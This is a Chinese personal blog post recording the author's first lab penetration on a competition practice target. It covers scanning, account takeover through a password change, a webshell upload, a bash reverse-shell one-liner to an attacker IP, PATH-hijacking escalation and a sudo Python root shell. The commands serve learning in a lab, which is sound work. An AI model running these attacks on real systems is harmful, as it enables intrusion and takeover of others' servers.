<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="format-detection" content="telephone=no"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black"><link rel="icon" href="/images/icons/favicon-16x16.png?v=2.7.0" type="image/png" sizes="16x16"><link rel="icon" href="/images/icons/favicon-32x32.png?v=2.7.0" type="image/png" sizes="32x32"><meta name="description" content="在鲲鹏杯的测试平台上第一次遇到了有关于靶机渗透的题目；感觉很有意思，有一种很真实的感觉，所以想记录一下">
<meta property="og:type" content="article">
<meta property="og:title" content="记录第一次靶机渗透">
<meta property="og:url" content="https://hyggevv.github.io/2023/04/10/%E7%AC%AC%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F/index.html">
<meta property="og:site_name" content="hey&#39;s blog">
<meta property="og:description" content="在鲲鹏杯的测试平台上第一次遇到了有关于靶机渗透的题目；感觉很有意思，有一种很真实的感觉，所以想记录一下">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://hyggevv.github.io/2023/04/10/%E7%AC%AC%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F/1.png">
<meta property="og:image" content="https://hyggevv.github.io/2023/04/10/%E7%AC%AC%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F/2.png">
<meta property="og:image" content="https://hyggevv.github.io/2023/04/10/%E7%AC%AC%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F/3.png">
<meta property="og:image" content="https://hyggevv.github.io/2023/04/10/%E7%AC%AC%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F/4.png">
<meta property="og:image" content="https://hyggevv.github.io/2023/04/10/%E7%AC%AC%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F/5.png">
<meta property="og:image" content="https://hyggevv.github.io/2023/04/10/%E7%AC%AC%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F/6.png">
<meta property="og:image" content="https://hyggevv.github.io/2023/04/10/%E7%AC%AC%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F/7.png">
<meta property="og:image" content="https://hyggevv.github.io/2023/04/10/%E7%AC%AC%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F/8.png">
<meta property="og:image" content="https://hyggevv.github.io/2023/04/10/%E7%AC%AC%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F/9.png">
<meta property="og:image" content="https://hyggevv.github.io/2023/04/10/%E7%AC%AC%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F/10.png">
<meta property="og:image" content="https://hyggevv.github.io/2023/04/10/%E7%AC%AC%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F/14.png">
<meta property="og:image" content="https://hyggevv.github.io/2023/04/10/%E7%AC%AC%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F/11.png">
<meta property="og:image" content="https://hyggevv.github.io/2023/04/10/%E7%AC%AC%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F/12.png">
<meta property="og:image" content="https://hyggevv.github.io/2023/04/10/%E7%AC%AC%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F/13.png">
<meta property="og:image" content="https://hyggevv.github.io/2023/04/10/%E7%AC%AC%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F/15.png">
<meta property="og:image" content="https://hyggevv.github.io/2023/04/10/%E7%AC%AC%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F/16.png">
<meta property="og:image" content="https://hyggevv.github.io/2023/04/10/%E7%AC%AC%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F/17.png">
<meta property="article:published_time" content="2023-04-10T15:30:21.000Z">
<meta property="article:modified_time" content="2023-04-25T12:56:31.378Z">
<meta property="article:author" content="hey">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://hyggevv.github.io/2023/04/10/%E7%AC%AC%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F/1.png"><title>记录第一次靶机渗透 | hey's blog</title><link ref="canonical" href="https://hyggevv.github.io/2023/04/10/%E7%AC%AC%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F/"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.12.1/css/all.min.css" type="text/css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" type="text/css"><link rel="stylesheet" href="/css/index.css?v=2.7.0"><script>var Stun = window.Stun || {};
var CONFIG = {
  root: '/',
  algolia: undefined,
  assistSearch: undefined,
  fontIcon: {"prompt":{"success":"fas fa-check-circle","info":"fas fa-arrow-circle-right","warning":"fas fa-exclamation-circle","error":"fas fa-times-circle"},"copyBtn":"fas fa-copy"},
  sidebar: {"offsetTop":"20px","tocMaxDepth":6},
  header: {"enable":true,"showOnPost":true,"scrollDownIcon":false},
  postWidget: {"endText":true},
  nightMode: {"enable":true},
  back2top: {"enable":true},
  codeblock: {"style":"carbon","highlight":"light","wordWrap":false},
  reward: false,
  fancybox: true,
  zoomImage: {"gapAside":"20px"},
  galleryWaterfall: undefined,
  lazyload: false,
  pjax: undefined,
  externalLink: {"icon":{"enable":true,"name":"fas fa-external-link-alt"}},
  shortcuts: undefined,
  prompt: {"copyButton":"Copy","copySuccess":"Copy Success","copyError":"Copy Error"},
  sourcePath: {"js":"js","css":"css","images":"images"},
};

window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 5.4.2"></head><body><div class="container" id="container"><header class="header" id="header"><div class="header-inner"><nav class="header-nav header-nav--fixed"><div class="header-nav-inner"><div class="header-nav-menubtn"><i class="fas fa-bars"></i></div><div class="header-nav-menu"><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/"><span class="header-nav-menu-item__icon"><i class="fas fa-home"></i></span><span class="header-nav-menu-item__text">Home</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/archives/"><span class="header-nav-menu-item__icon"><i class="fas fa-folder-open"></i></span><span class="header-nav-menu-item__text">Archives</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/categories/"><span class="header-nav-menu-item__icon"><i class="fas fa-layer-group"></i></span><span class="header-nav-menu-item__text">Categories</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/tags/"><span class="header-nav-menu-item__icon"><i class="fas fa-tags"></i></span><span class="header-nav-menu-item__text">Tags</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/about/"><span class="header-nav-menu-item__icon"><i class="fas fa-user"></i></span><span class="header-nav-menu-item__text">About</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/read/"><span class="header-nav-menu-item__icon"><i class="fas fa-book"></i></span><span class="header-nav-menu-item__text">menu.read</span></a></div></div><div class="header-nav-mode"><div class="mode"><div class="mode-track"><span class="mode-track-moon"></span><span class="mode-track-sun"></span></div><div class="mode-thumb"></div></div></div></div></nav><div class="header-banner"><div class="header-banner-info"><div class="header-banner-info__title">hey's blog</div><div class="header-banner-info__subtitle">天气转晴太阳崭新我在前进</div></div></div></div></header><main class="main" id="main"><div class="main-inner"><div class="content-wrap" id="content-wrap"><div class="content" id="content"><!-- Just used to judge whether it is an article page--><div id="is-post"></div><div class="post"><header class="post-header"><h1 class="post-title">记录第一次靶机渗透</h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2023-04-10</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2023-04-25</span></span><span class="post-meta-item post-meta-item--visitors"><span class="post-meta-item__icon"><i class="fas fa-eye"></i></span><span class="post-meta-item__info">Visited</span><span class="post-meta-item__value" id="busuanzi_value_page_pv"></span></span></div></header><div class="post-body">
        <h2 id="前言">
          <a href="#前言" class="heading-link"><i class="fas fa-link"></i></a><a href="#前言" class="headerlink" title="前言"></a>前言</h2>
      <p>这一次在鲲鹏杯的测试平台中第一次接触到渗透题感觉十分的手足无措；便在博客里面记录一下第一次渗透的流程</p>

        <h2 id="信息收集">
          <a href="#信息收集" class="heading-link"><i class="fas fa-link"></i></a><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2>
      <p>拿到vof导入后；先查看我们NAT的ip地址<br><img src="/2023/04/10/%E7%AC%AC%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F/1.png"><br>然后进行信息收集；信息收集主要分为存活主机探测和端口扫描和网站扫描；可以使用nmap或者fscan;此时我们用fscan进行扫描<br><img src="/2023/04/10/%E7%AC%AC%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F/2.png"><br><img src="/2023/04/10/%E7%AC%AC%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F/3.png"><br>此时发现了80和22端口都有开放并且网站192.168.78.139和192.168.78.1也存活；此时我们可以使用后台扫描工具dirsearch进行扫描看看是否存在信息泄露；此时经过扫描发现并不存在常见的信息泄露；但是却有意外的收获发现了一个&#x2F;upload<br><img src="/2023/04/10/%E7%AC%AC%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F/4.png"></p>

        <h2 id="验证逻辑漏洞-纵向越权修改admin密码">
          <a href="#验证逻辑漏洞-纵向越权修改admin密码" class="heading-link"><i class="fas fa-link"></i></a><a href="#验证逻辑漏洞-纵向越权修改admin密码" class="headerlink" title="验证逻辑漏洞(纵向越权修改admin密码)"></a>验证逻辑漏洞(纵向越权修改admin密码)</h2>
      <p>那么我们此时登入网站192.168.78.139看看是否存在逻辑漏洞；此时发现是一个登入界面；此时我们进行注册登入<br><img src="/2023/04/10/%E7%AC%AC%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F/5.png"><br>此时发现url上方的id&#x3D;7，此时有理由怀疑是存在sql注入漏洞;但是因为在扫描时发现了upload；此时我们更加可以怀疑这里存在文件上传漏洞;但是我们在本用户界面却没有发现可以进行文件上传的地方；但是根据之前的题目经验我们知道这种存在登入的界面会存在一个管理员的账号和密码；所以我们先尝试利用自身登入的cookie看看能否进入管理员此时发现不行；接下来我们便可以通过我们第一次登入时id&#x3D;2不是id&#x3D;1来猜想id&#x3D;1是管理员；此时我们先来验证一下我们的逻辑漏洞是否正确；因为不知道admin的密码；所以此时通过更改密码来获取admin的登入权限<br><img src="/2023/04/10/%E7%AC%AC%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F/6.png"><br><img src="/2023/04/10/%E7%AC%AC%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F/7.png"><br>此时发现已经可以登入管理员的后台界面；并且发现了一个可以上传文件的地方<br><img src="/2023/04/10/%E7%AC%AC%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F/8.png"><br>此时考虑上传一句话木马来控制；经过测试只有后缀为.phtml的可以上传<br><img src="/2023/04/10/%E7%AC%AC%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F/9.png"></p>

        <h2 id="反弹shell">
          <a href="#反弹shell" class="heading-link"><i class="fas fa-link"></i></a><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h2>
      <p>此时我们在&#x2F;home下面发现了一个叫做john的用户和flag1.txt;而因为我们的权限不够所以无法获得其中的内容；所以此时我们考虑的就是权限的提升；先把权限提升到john用户上然后再来查看我们的flag1.txt；我们此时可以先反弹一个shell到我们的攻击机kali上；<br><img src="/2023/04/10/%E7%AC%AC%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F/10.png"><br>此时也可以通过命令查看到我们下一步需要提取的对象为john或者darkhole；然后结合在蚁剑上看到flag1.txt确定我们下一步的提取对象为john<br><img src="/2023/04/10/%E7%AC%AC%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F/14.png"><br>反弹shell：</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">反弹shell：</span><br><span class="line">攻击者指定服务端，受害者主机主动连接攻击者的服务端程序；就是攻击机监听在某个TCP或者UDP端口为服务端，目标机主动发起请求到攻击机监听的端口，并将其命令行的输入输出转到攻击机。反弹shell是指攻击者通过某种方式入侵了目标服务器，并且在目标服务器中设置了一个命令shell；使得攻击者可以从本地计算机向目标服务器发送命令并且接受目标服务器的反馈信息。攻击者可以在没有权限的情况下远程控制服务器从而获取敏感数据。</span><br></pre></td></tr></table></div></figure>
<p>反弹shell的方式有很多种这里先写利用Bash反弹shell</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/攻击机IP/攻击机端口 0&gt;&amp;1</span><br><span class="line">命令                   命令详解</span><br><span class="line">bash -i:            产生一个bash交互环境。</span><br><span class="line">&gt;&amp;:             将联合符号前面的内容与后面相结合，然后一起重定向给后者。</span><br><span class="line">/dev/tcp/47.xxx.xxx.72/2333: Linux环境中所有的内容都是以文件的形式存在的，其实大家一看见这个内容就能明白，就是让目标主机与攻击机47.xxx.xxx.72的2333端口建立一个tcp连接。</span><br><span class="line">0&gt;&amp;1:  将标准输入与标准输出的内容相结合，然后重定向给前面标准输出的内容。</span><br></pre></td></tr></table></div></figure>
<p>bash反弹shell的解读就是：<br>Bash产生了一个交互环境和本地主机主动发起与攻击机2333端口建立的连接（即TCP：2333会话连接）相结合，然后在重定向给TCP：2333会话连接，最后将用户键盘输入与用户标准输出相结合再次重定向给一个标准的输出，即得到一个Bash反弹环境。通过这样的命令，我们就可以就是将B的标准输出和错误输出都重定向给A，并且将A的输入都重定向给B，这样我们就可以实现A对B的远程控制了。<br>此时我们先查看一下本机kali的ip并且开启监听;并且在蚁剑中反弹shell；此时再回到我们的kali发现我们已经可以在没有权限的情况下实现对该服务器的远程控制了。<br><img src="/2023/04/10/%E7%AC%AC%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F/11.png"></p>

        <h2 id="提升权限-环境变量劫持用户shell">
          <a href="#提升权限-环境变量劫持用户shell" class="heading-link"><i class="fas fa-link"></i></a><a href="#提升权限-环境变量劫持用户shell" class="headerlink" title="提升权限(环境变量劫持用户shell)"></a>提升权限(环境变量劫持用户shell)</h2>
      <p>此时我们进入我们在蚁剑中发现的用户john目录中看看能否提取flag1.txt；此时发现权限不足并且发现了一个比较特别的文件.&#x2F;toto；<br><img src="/2023/04/10/%E7%AC%AC%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F/12.png"><br>我们执行一下.&#x2F;toto文件看看会怎么样<br><img src="/2023/04/10/%E7%AC%AC%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F/13.png"><br>此时发现uid&#x3D;john;即为这个文件是id的副本，它以John用户的身份执行；所以此时我们可以利用这个文件先将我们的权限提升到john用户上面；此时我们利用的方法是采用环境变量劫持的方法获得用户john的shell<br>权限提升之环境变量劫持：</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;/bin/bash&quot; &gt; /tmp/id</span><br><span class="line">chmod +x /tmp/id</span><br><span class="line">export PATH=/tmp:$PATH</span><br><span class="line">./toto</span><br></pre></td></tr></table></div></figure>
<p>echo “&#x2F;bin&#x2F;bash” &gt; &#x2F;tmp&#x2F;id: 在&#x2F;tmp&#x2F;id文件中写入字符串”&#x2F;bin&#x2F;bash”；执行这条命令后会在&#x2F;tmp的目录下创建一个名为id的<br>文件；其中包含了字符串”&#x2F;bin&#x2F;tmp”<br>chmod +x &#x2F;tmp&#x2F;id:作用为赋予&#x2F;tmp&#x2F;id文件可执行权限；执行该命令之后&#x2F;tmp&#x2F;id文件就有了可执行权限，可以在终端中执行该文<br>件<br>export PATH&#x3D;&#x2F;tmp:$PATH 该指令将系统变量PATH的路径修改为&#x2F;tmp:$PATH;这将导致系统先在&#x2F;tmp目录下查找可执行文件，这样<br>可以使得攻击者往&#x2F;tmp目录下储存包含恶意代码的可执行文件</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">在/tmp目录下创建id文件echo &quot;/bin/bash&quot;&gt;id &amp;&amp; chmod +x id查看当前环境变量:echo $PATH把/tmp目录添加到环境变量export PATH=/tmp:$PATH再次查看环境变量是否添加成功echo $PATH执行toto/home/john/toto</span><br></pre></td></tr></table></div></figure>
<p>我们可以尝试利用这个特性，在本地编辑新的id文件，写入&#x2F;bin&#x2F;bash，给执行权限。然后将文件路径写入到原有环境变量前（从前往后顺序匹配），这样使用id命令时就会优先匹配此路径下的id文件，运行toto文件使用john身份调用id命令时就会获得shell。<br>此时我们已经获得用户john的权限并且可以查看用户john的任意文件<br><img src="/2023/04/10/%E7%AC%AC%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F/15.png"></p>

        <h2 id="获取root权限">
          <a href="#获取root权限" class="heading-link"><i class="fas fa-link"></i></a><a href="#获取root权限" class="headerlink" title="获取root权限"></a>获取root权限</h2>
      <p>渗透的最终目标都是获得root权限；只有拿到root权限之后可以做的事情才会更多；我们此时可以先查看一下具有sudo的权限命令；此时看到用户john可以编辑和运行file.py脚本<br><img src="/2023/04/10/%E7%AC%AC%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F/16.png"><br>此时我们将获取shell的命令加入到python脚本中再去执行就可以获得root权限了</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo &#x27;import os;os.system(&quot;/bin/bash&quot;)&#x27; &gt; file.py</span><br><span class="line">sudo python3 /home/john/file.py</span><br></pre></td></tr></table></div></figure>
<p><img src="/2023/04/10/%E7%AC%AC%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F/17.png"></p>
</div><footer class="post-footer"><div class="post-ending ending"><div class="ending__text">------ END ------</div></div><div class="post-copyright copyright"><div class="copyright-author"><span class="copyright-author__name">Author: </span><span class="copyright-author__value"><a href="https://hyggevv.github.io">hey</a></span></div><div class="copyright-link"><span class="copyright-link__name">Link: </span><span class="copyright-link__value"><a href="https://hyggevv.github.io/2023/04/10/%E7%AC%AC%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F/">https://hyggevv.github.io/2023/04/10/%E7%AC%AC%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F/</a></span></div><div class="copyright-notice"><span class="copyright-notice__name">Copyright: </span><span class="copyright-notice__value">All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" rel="external nofollow" target="_blank">BY-NC-SA</a> unless stating additionally</span></div></div><nav class="post-paginator paginator"><div class="paginator-prev"><a class="paginator-prev__link" href="/2023/04/17/OWASP-top10/"><span class="paginator-prev__icon"><i class="fas fa-angle-left"></i></span><span class="paginator-prev__text">初探OWASP TOP10</span></a></div><div class="paginator-next"><a class="paginator-next__link" href="/2023/04/07/preg-replace%E7%9A%84%E7%BB%95%E8%BF%87/"><span class="paginator-prev__text">正则匹配的绕过</span><span class="paginator-next__icon"><i class="fas fa-angle-right"></i></span></a></div></nav></footer></div></div></div><div class="sidebar-wrap" id="sidebar-wrap"><aside class="sidebar" id="sidebar"><div class="sidebar-nav"><span class="sidebar-nav-toc current">Catalog</span><span class="sidebar-nav-ov">Overview</span></div><section class="sidebar-toc"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">
          前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">2.</span> <span class="toc-text">
          信息收集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%AA%8C%E8%AF%81%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E-%E7%BA%B5%E5%90%91%E8%B6%8A%E6%9D%83%E4%BF%AE%E6%94%B9admin%E5%AF%86%E7%A0%81"><span class="toc-number">3.</span> <span class="toc-text">
          验证逻辑漏洞(纵向越权修改admin密码)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%8D%E5%BC%B9shell"><span class="toc-number">4.</span> <span class="toc-text">
          反弹shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8F%90%E5%8D%87%E6%9D%83%E9%99%90-%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E5%8A%AB%E6%8C%81%E7%94%A8%E6%88%B7shell"><span class="toc-number">5.</span> <span class="toc-text">
          提升权限(环境变量劫持用户shell)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96root%E6%9D%83%E9%99%90"><span class="toc-number">6.</span> <span class="toc-text">
          获取root权限</span></a></li></ol></section><!-- ov = overview--><section class="sidebar-ov hide"><div class="sidebar-ov-author"><div class="sidebar-ov-author__avatar"><img class="sidebar-ov-author__avatar_img" src="/images/usually.jpg" alt="avatar"></div><p class="sidebar-ov-author__text">hey</p></div><div class="sidebar-ov-state"><a class="sidebar-ov-state-item sidebar-ov-state-item--posts" href="/archives/"><div class="sidebar-ov-state-item__count">120</div><div class="sidebar-ov-state-item__name">Archives</div></a><a class="sidebar-ov-state-item sidebar-ov-state-item--categories" href="/categories/"><div class="sidebar-ov-state-item__count">0</div><div class="sidebar-ov-state-item__name">Categories</div></a><a class="sidebar-ov-state-item sidebar-ov-state-item--tags" href="/tags/"><div class="sidebar-ov-state-item__count">0</div><div class="sidebar-ov-state-item__name">Tags</div></a></div><div class="sidebar-ov-cc"><a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" target="_blank" rel="noopener" data-popover="Creative Commons" data-popover-pos="up"><img src="/images/cc-by-nc-sa.svg"></a></div></section><div class="sidebar-reading"><div class="sidebar-reading-info"><span class="sidebar-reading-info__text">You have read </span><span class="sidebar-reading-info__num">0</span><span class="sidebar-reading-info__perc">%</span></div><div class="sidebar-reading-line"></div></div></aside></div><div class="clearfix"></div></div></main><footer class="footer" id="footer"><div class="footer-inner"><div><span>Copyright © 2025</span><span class="footer__icon"><i class="fas fa-heart"></i></span><span>hey</span></div><div><span>Powered by <a href="http://hexo.io/" title="Hexo" target="_blank" rel="noopener">Hexo</a></span><span> v5.4.2</span><span class="footer__devider">|</span><span>Theme - <a href="https://github.com/liuyib/hexo-theme-stun/" title="Stun" target="_blank" rel="noopener">Stun</a></span><span> v2.7.0</span></div><div class="busuanzi"><span class="busuanzi-sitepv"><span class="busuanzi-siteuv__icon"><i class="fas fa-eye"></i></span><span class="busuanzi-siteuv__info">Views</span><span class="busuanzi-siteuv__value" id="busuanzi_value_site_pv"></span></span></div></div></footer><div class="loading-bar" id="loading-bar"><div class="loading-bar__progress"></div></div><div class="back2top" id="back2top"><span class="back2top__icon"><i class="fas fa-rocket"></i></span></div></div><script src="https://cdn.jsdelivr.net/npm/jquery@v3.4.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.ui.min.js"></script><script src="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/gh/sukkaw/busuanzi@latest/bsz.pure.mini.js" async></script><script src="/js/utils.js?v=2.7.0"></script><script src="/js/stun-boot.js?v=2.7.0"></script><script src="/js/scroll.js?v=2.7.0"></script><script src="/js/header.js?v=2.7.0"></script><script src="/js/sidebar.js?v=2.7.0"></script><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/hijiki.model.json"},"display":{"position":"right","width":180,"height":300},"mobile":{"show":true},"log":false});</script></body></html>